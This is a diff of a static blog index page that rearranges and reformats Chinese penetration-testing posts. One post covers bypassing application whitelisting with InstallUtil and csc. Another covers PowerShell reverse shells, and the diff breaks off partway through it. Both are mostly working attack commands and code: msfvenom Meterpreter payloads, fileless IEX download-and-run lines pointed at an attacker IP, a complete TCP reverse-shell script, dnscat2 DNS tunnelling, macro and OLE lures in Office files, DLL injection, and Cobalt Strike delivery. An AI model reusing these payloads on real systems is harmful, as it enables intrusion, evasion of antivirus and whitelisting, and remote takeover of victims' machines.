@@ -252,157 +252,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="pplsec">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/ppl.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="pplsec">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/" itemprop="url">InstallUtil&csc.exe-bypass application whitelisting</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T22:38:36+08:00">
-                2019-03-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1）通过msfvenom生成C＃的shellcode"><a href="#1）通过msfvenom生成C＃的shellcode" class="headerlink" title="1）通过msfvenom生成C＃的shellcode"></a>1）通过msfvenom生成C＃的shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp</span><br></pre></td></tr></table></figure>
-<p><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-1.png" alt=""></p>
-<h3 id="2）下载InstallUtil-Shellcode-cs，将上面生成的shellcode复制到该cs文件中"><a href="#2）下载InstallUtil-Shellcode-cs，将上面生成的shellcode复制到该cs文件中" class="headerlink" title="2）下载InstallUtil-Shellcode.cs，将上面生成的shellcode复制到该cs文件中"></a>2）下载InstallUtil-Shellcode.cs，将上面生成的shellcode复制到该cs文件中</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260 </span><br><span class="line">InstallUtil-Shellcode-cs</span><br></pre></td></tr></table></figure>
-<h3 id="3）csc编译InstallUtil-ShellCode-cs"><a href="#3）csc编译InstallUtil-ShellCode-cs" class="headerlink" title="3）csc编译InstallUtil-ShellCode.cs"></a>3）csc编译InstallUtil-ShellCode.cs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:D:\test\InstallUtil-shell.exe D:\test\InstallUtil-ShellCode.cs</span><br></pre></td></tr></table></figure>
-<p>编译生成的文件后缀名无所谓exe dll txt都可以，但只能InstallUtil.exe来触发<br><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-2.png" alt=""></p>
-<h3 id="4）InstallUtil-exe执行-反弹shell"><a href="#4）InstallUtil-exe执行-反弹shell" class="headerlink" title="4）InstallUtil.exe执行 反弹shell"></a>4）InstallUtil.exe执行 反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U D:\test\InstallUtil-shell.exe</span><br></pre></td></tr></table></figure>
-<p><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-3.png" alt=""></p>
-<p>成功bypass av，反弹shell：<br><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-4.png" alt=""></p>
-<h3 id="补充：MSF开启监听"><a href="#补充：MSF开启监听" class="headerlink" title="补充：MSF开启监听"></a>补充：MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.0.19</span><br><span class="line">set LPORT 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
-<p><strong>参考:</strong><br><a href="https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/</a> </p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/MSBuild.exe-bypass-application-whitelisting/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -554,6 +403,157 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/" itemprop="url">InstallUtil&csc.exe-bypass application whitelisting</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T22:38:36+08:00">
+                2019-03-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="1）通过msfvenom生成C＃的shellcode"><a href="#1）通过msfvenom生成C＃的shellcode" class="headerlink" title="1）通过msfvenom生成C＃的shellcode"></a>1）通过msfvenom生成C＃的shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp</span><br></pre></td></tr></table></figure>
+<p><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-1.png" alt=""></p>
+<h3 id="2）下载InstallUtil-Shellcode-cs，将上面生成的shellcode复制到该cs文件中"><a href="#2）下载InstallUtil-Shellcode-cs，将上面生成的shellcode复制到该cs文件中" class="headerlink" title="2）下载InstallUtil-Shellcode.cs，将上面生成的shellcode复制到该cs文件中"></a>2）下载InstallUtil-Shellcode.cs，将上面生成的shellcode复制到该cs文件中</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260 </span><br><span class="line">InstallUtil-Shellcode-cs</span><br></pre></td></tr></table></figure>
+<h3 id="3）csc编译InstallUtil-ShellCode-cs"><a href="#3）csc编译InstallUtil-ShellCode-cs" class="headerlink" title="3）csc编译InstallUtil-ShellCode.cs"></a>3）csc编译InstallUtil-ShellCode.cs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:D:\test\InstallUtil-shell.exe D:\test\InstallUtil-ShellCode.cs</span><br></pre></td></tr></table></figure>
+<p>编译生成的文件后缀名无所谓exe dll txt都可以，但只能InstallUtil.exe来触发<br><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-2.png" alt=""></p>
+<h3 id="4）InstallUtil-exe执行-反弹shell"><a href="#4）InstallUtil-exe执行-反弹shell" class="headerlink" title="4）InstallUtil.exe执行 反弹shell"></a>4）InstallUtil.exe执行 反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U D:\test\InstallUtil-shell.exe</span><br></pre></td></tr></table></figure>
+<p><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-3.png" alt=""></p>
+<p>成功bypass av，反弹shell：<br><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-4.png" alt=""></p>
+<h3 id="补充：MSF开启监听"><a href="#补充：MSF开启监听" class="headerlink" title="补充：MSF开启监听"></a>补充：MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.0.19</span><br><span class="line">set LPORT 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+<p><strong>参考:</strong><br><a href="https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/</a> </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/06/powershell反弹shell常见方式/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -573,7 +573,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/03/06/powershell反弹shell常见方式/" itemprop="url">后渗透之meterpreter使用攻略</a></h1>
+                <a class="post-title-link" href="/2019/03/06/powershell反弹shell常见方式/" itemprop="url">powershell反弹shell常见方式</a></h1>
         
 
         <div class="post-meta">
@@ -661,24 +661,39 @@
 <h4 id="Reverse-ICMP-shell"><a href="#Reverse-ICMP-shell" class="headerlink" title="Reverse ICMP shell"></a>Reverse ICMP shell</h4><p>需要利用icmpsh_m.py (<a href="https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1</a> 来反弹ICMP shell。</p>
 <p>首先攻击端下载icmpsh_m.py文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icmpsh_m.py Usage：</span><br><span class="line">python icmpsh_m.py [Attacker IP] [Victim IP]</span><br></pre></td></tr></table></figure></p>
 <p>攻击者(192.168.159.134)执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包</span><br><span class="line">python icmpsh_m.py 192.168.159.134 192.168.159.138 #开启监听</span><br></pre></td></tr></table></figure></p>
-<p>目标机(192.168.159.138)执行：<br>powershell IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1&#39;);Invoke-PowerShellIcmp" target="_blank" rel="noopener">http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1&#39;);Invoke-PowerShellIcmp</a> -IPAddress 192.168.159.134<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### 3) 自定义powershell函数反弹shell</span><br><span class="line">利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell，其实也是借鉴nishang中的Invoke-PowerShellTcpOneLine.ps1</span><br><span class="line"></span><br><span class="line">攻击者(192.168.159.134) 开启监听：</span><br></pre></td></tr></table></figure></p>
-<p>nc -lvp 6666<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">目标机执行：</span><br></pre></td></tr></table></figure></p>
-<p>powershell -nop -c “$client = New-Object Net.Sockets.TCPClient(‘192.168.159.134’,6666);$stream = $client.GetStream();<br>[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;<br>$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );<br>$sendback2 = $sendback + ‘PS ‘ + (pwd).Path + ‘&gt; ‘;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);<br>$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">或者保存为lltest_tcp.ps1文件</span><br></pre></td></tr></table></figure></p>
-<p>powershell IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.159.134/lltest_tcp.ps1&#39;);Invoke-lltestTcp" target="_blank" rel="noopener">http://192.168.159.134/lltest_tcp.ps1&#39;);Invoke-lltestTcp</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">lltest_tcp.ps1 如下：</span><br></pre></td></tr></table></figure></p>
-<p>function Invoke-lltestTcp<br>{<br>$client = New-Object Net.Sockets.TCPClient(‘192.168.159.134’,6666)<br>$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}<br>while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)<br>{<br>$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)<br>$sendback = (iex $data 2&gt;&amp;1 | Out-String )<br>$sendback2 = $sendback + ‘PS ‘ + (pwd).Path + ‘&gt; ‘<br>$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)<br>$stream.Write($sendbyte,0,$sendbyte.Length)<br>$stream.Flush()<br>}<br>$client.Close()<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 4) dnscat2 反弹DNS shell</span><br><span class="line">dnscat2(https://github.com/iagox86/dnscat2 )是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(https://github.com/lukebaggett/dnscat2-powershell)</span><br><span class="line"></span><br><span class="line">#### 利用dnscat2 和 dnscat2-powershell实现反弹DNS shell:</span><br><span class="line"></span><br><span class="line">攻击者(Ubuntu 14.04 LTS 192.168.159.129)开启监听：</span><br></pre></td></tr></table></figure></p>
-<p>ruby dnscat2.rb –dns “domain=lltest.com,host=192.168.159.129” –no-cache -e open<br>-e open 不使用加密连接，默认使用加密<br>ruby dnscat2.rb —help 查看帮助<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">目标机执行：</span><br></pre></td></tr></table></figure></p>
-<p>powershell IEX (New-Object System.Net.Webclient).DownloadString(‘<a href="https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;);Start-Dnscat2" target="_blank" rel="noopener">https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;);Start-Dnscat2</a> -Domain lltest.com -DNSServer 192.168.159.129<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">成功反弹shell后，攻击者：</span><br></pre></td></tr></table></figure></p>
-<p>session -i 1 #进入到session 1<br>shell #执行之后会新生成一个session 需要通过session -i 2 切换<br>session -i 2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 5) Empire 结合office反弹shell</span><br><span class="line">Empire(https://github.com/EmpireProject/Empire ) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell</span><br><span class="line"></span><br><span class="line">#### 利用office 宏反弹shell</span><br><span class="line">攻击者(192.168.159.134)开启监听:</span><br></pre></td></tr></table></figure></p>
-<p>uselistener http<br>execute<br>back<br>usestager windows/macro http #生成payload<br>execute<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">生成/tmp/macro 攻击代码后，新建一个word 创建宏</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">点击“文件”-“宏”-“创建”，删除自带的脚本，复制进去/tmp/macro文件内容，并保存为“Word 97-2003文档(.doc)”或者“启用宏的Word 文档(.docm)”文件，当诱导目标打开，执行宏后，即可成功反弹shell：</span><br><span class="line">说明:需要开启宏或者用户手动启用宏。开启宏设置：“文件”-“选项”-“信任中心”,选择“启用所有宏”</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 利用office OLE对象插入bat文件反弹shell</span><br><span class="line">攻击者(192.168.159.134)开启监听 并生成bat文件payload：</span><br></pre></td></tr></table></figure></p>
-<p>listeners<br>usestager windows/launcher_bat http<br>execute<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在word中“插入”-“对象”-“由文件创建” 处，插入launcher.bat文件，可更改文件名称和图标，进行伪装，当诱导目标点击launcher_lltest.xls文件，执行后，即可成功反弹shell：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 6) PowerSploit DLL注入反弹shell</span><br><span class="line">PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。</span><br><span class="line">利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell</span><br><span class="line"></span><br><span class="line">1）msfvenom生成dll后门</span><br></pre></td></tr></table></figure></p>
-<p>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.134 lport=6667 -f dll -o /var/www/html/PowerSploit/lltest.dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">说明：目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2）metasploit 设置payload 开启监听</span><br></pre></td></tr></table></figure></p>
-<p>use exploit/multi/handler<br>set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>set LHOST 192.168.159.134<br>set LPORT 6667<br>exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3）powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门</span><br><span class="line">首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程</span><br><span class="line"></span><br><span class="line">目标机执行:</span><br></pre></td></tr></table></figure></p>
-<p>Get-Process #选择要注入的进程<br>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.159.134/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;" target="_blank" rel="noopener">http://192.168.159.134/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;</a>)<br>Invoke-DllInjection -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 7) metasploit反弹shell</span><br><span class="line">利用metasploit的web_delivery模块可通过python、php、powershell、regsvr32等进行反弹shell</span><br><span class="line"></span><br><span class="line">攻击者(192.168.159.134)：</span><br></pre></td></tr></table></figure></p>
-<p>use exploit/multi/script/web_delivery<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set target 2<br>set LHOST 192.168.159.134<br>set LPORT 6666<br>exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标机执行：</span><br></pre></td></tr></table></figure></p>
-<p>powershell.exe -nop -w hidden -c $f=new-object net.webclient;$f.proxy=[Net.WebRequest]::GetSystemWebProxy();<br>$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $f.downloadstring(‘<a href="http://192.168.159.134:8080/4iNSwaMtwWjm&#39;)" target="_blank" rel="noopener">http://192.168.159.134:8080/4iNSwaMtwWjm&#39;)</a>;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 8) Cobalt strike反弹shell</span><br><span class="line">Cobalt strike的Scripted Web Delivery模块，可通过bitsadmin、powershell、python、regsvr32等进行反弹shell，类似metasploit的web_delivery模块</span><br><span class="line">说明：安装Cobalt strike时推荐 java version “1.8.0_121”</span><br><span class="line"></span><br><span class="line">1)运行服务端</span><br></pre></td></tr></table></figure></p>
-<p>./teamserver 192.168.159.134 lltest #lltest为连接密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2)运行客户端：</span><br></pre></td></tr></table></figure></p>
-<p>./cobaltstrike #用户名随便输入 密码lltest<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3)开启监听:</span><br><span class="line">首先要创建一个Listener, 点击 Cobalt Strike-&gt;Listeners ，然后点击Add便可创建Listeners</span><br><span class="line"></span><br><span class="line">点击Cobalt Strike-&gt;Listeners</span><br><span class="line">payload可选择windows/beacon_http/reverse_http</span><br><span class="line">说明：其中windows/beacon 是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign 为外部监听器，即msf或者Armitage的监听器。</span><br><span class="line"></span><br><span class="line">4)生成powershell payload:</span><br><span class="line">点击Attack -&gt; Web Drive-by -&gt; Scripted Web Delivery</span><br><span class="line">Type选择 powershell</span><br><span class="line"></span><br><span class="line">5)目标机执行powershell payload:</span><br></pre></td></tr></table></figure></p>
-<p>powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘<a href="http://192.168.159.134:83/a&#39;))&quot;" target="_blank" rel="noopener">http://192.168.159.134:83/a&#39;))&quot;</a><br><code>`</code><br>6)成功反弹shell后，右键interact 进入shell</p>
+<p>目标机(192.168.159.138)执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1&apos;);Invoke-PowerShellIcmp -IPAddress 192.168.159.134</span><br></pre></td></tr></table></figure></p>
+<h3 id="3-自定义powershell函数反弹shell"><a href="#3-自定义powershell函数反弹shell" class="headerlink" title="3) 自定义powershell函数反弹shell"></a>3) 自定义powershell函数反弹shell</h3><p>利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell，其实也是借鉴nishang中的Invoke-PowerShellTcpOneLine.ps1</p>
+<p>攻击者(192.168.159.134) 开启监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666</span><br></pre></td></tr></table></figure></p>
+<p>目标机执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&apos;192.168.159.134&apos;,6666);$stream = $client.GetStream();</span><br><span class="line">[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;</span><br><span class="line">$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );</span><br><span class="line">$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);</span><br><span class="line">$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure></p>
+<p>或者保存为lltest_tcp.ps1文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.159.134/lltest_tcp.ps1&apos;);Invoke-lltestTcp</span><br></pre></td></tr></table></figure></p>
+<p>lltest_tcp.ps1 如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function Invoke-lltestTcp</span><br><span class="line">&#123;</span><br><span class="line">$client = New-Object Net.Sockets.TCPClient(&apos;192.168.159.134&apos;,6666)</span><br><span class="line">$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;</span><br><span class="line">while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)</span><br><span class="line">&#123;</span><br><span class="line">$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)</span><br><span class="line">$sendback = (iex $data 2&gt;&amp;1 | Out-String )</span><br><span class="line">$sendback2 = $sendback + &apos;PS 